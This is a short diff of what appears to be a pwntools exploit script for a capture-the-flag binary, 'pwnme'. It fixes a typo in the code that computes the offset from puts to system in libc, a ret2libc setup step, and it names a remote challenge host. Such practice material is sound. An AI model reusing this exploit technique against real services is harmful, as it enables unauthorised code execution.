@@ -3,17 +3,18 @@ from subprocess import *
 DEBUG=1
 list = [ ]
 if DEBUG:
-    #os.environ["LD_PRELOAD"] = os.path.join(os.getcwd(),'libc.so.6')
+    #this libc doesn't work on my ubuntu
+    #os.environ["LD_PRELOAD"] = os.path.join(os.getcwd(),'libc.so.6') 
     #context.log_level = 'debug'
     p = process("./pwnme")
-    #use ida offset = system_addr - puts_addr
+    #so use ida to get offset = system_addr - puts_addr
     offset = -0x24f30
 
 else:
     context.log_level = 'info'
     p = remote("117.34.105.33",6002)
     #here is use elf(libc)
-    offset = libc.symbols['system'] - libc.sybols['puts']
+    offset = libc.symbols['system'] - libc.symbols['puts']
 
 #init time_seed table
 #rand() will prouce same randnum-seq if srand's seed is same 
